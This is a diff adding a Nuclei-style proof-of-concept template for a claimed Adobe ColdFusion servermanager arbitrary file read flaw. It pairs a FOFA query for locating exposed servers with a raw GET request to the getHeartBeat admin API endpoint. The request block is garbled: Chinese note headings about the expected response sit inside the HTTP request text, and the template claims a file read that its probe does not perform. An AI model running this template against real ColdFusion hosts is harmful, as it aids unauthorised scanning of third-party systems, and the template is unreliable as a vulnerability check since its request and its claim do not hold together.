@@ -1,0 +1,43 @@
+id: poc-qkvxshb12n6qo7no
+info:
+  name: Adobe ColdFusion servermanager 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qkvxshb12n6qo7no'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qkvxshb12n6qo7no
+    fofa: app="Adobe-ColdFusion" && title=="Error Occurred While Processing Request"
+http:
+- raw:
+  - 'GET /CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    uuid
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
